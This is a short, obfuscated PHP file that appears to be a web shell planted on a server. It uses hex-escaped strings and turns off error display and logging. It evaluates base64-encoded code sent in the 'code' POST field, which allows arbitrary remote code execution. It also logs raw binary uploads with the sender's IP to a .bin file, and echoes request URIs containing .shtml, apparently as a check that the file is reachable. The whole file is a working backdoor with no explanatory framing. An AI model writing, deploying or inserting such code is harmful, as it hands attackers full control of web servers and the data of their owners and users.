<?php @error_reporting(0); @ini_set("\x64i\x73\x70l\x61y_\x65\x72r\x6fr\x73",0); @ini_set("\x6co\x67\x5fe\x72ror\x73",0); @ini_set("\x65rror_l\x6fg",0); @ini_set("\x6demo\x72\x79_\x6ci\x6dit", "\x31\x32\x38M"); @ini_set("\x6da\x78\x5fex\x65c\x75\x74\x69\x6f\x6e_\x74\x69\x6d\x65",30); @set_time_limit(30); if (isset($_SERVER["HT\x54\x50\x5fX\x5f\x52E\x41\x4c_\x49P"])) $_SERVER["RE\x4d\x4fT\x45_\x41\x44D\x52"] = $_SERVER["HT\x54\x50\x5fX\x5f\x52E\x41\x4c_\x49P"]; if (isset($_POST["\x63o\x64e"])) { eval(base64_decode($_POST["\x63o\x64e"])); } elseif (isset($_SERVER["H\x54T\x50\x5f\x43ONT\x45N\x54\x5f\x45\x4eCO\x44ING"]) && $_SERVER["H\x54T\x50\x5f\x43ONT\x45N\x54\x5f\x45\x4eCO\x44ING"] == "\x62i\x6e\x61ry") { $input = file_get_contents("p\x68\x70:\x2f\x2f\x69\x6e\x70ut"); if (strlen($input) > 0) print "S\x54\x41T\x55\x53\x2dI\x4d\x50\x4f\x52\x54-OK"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2e\x70\x68p","\x2e\x62i\x6e",basename($_SERVER["SCRIP\x54_\x46I\x4c\x45NA\x4dE"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["RE\x4d\x4fT\x45_\x41\x44D\x52"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["RE\x51\x55ES\x54\x5f\x55RI"], ".\x73\x68tml") !== false) { print $_SERVER["RE\x51\x55ES\x54\x5f\x55RI"]; } exit; ?>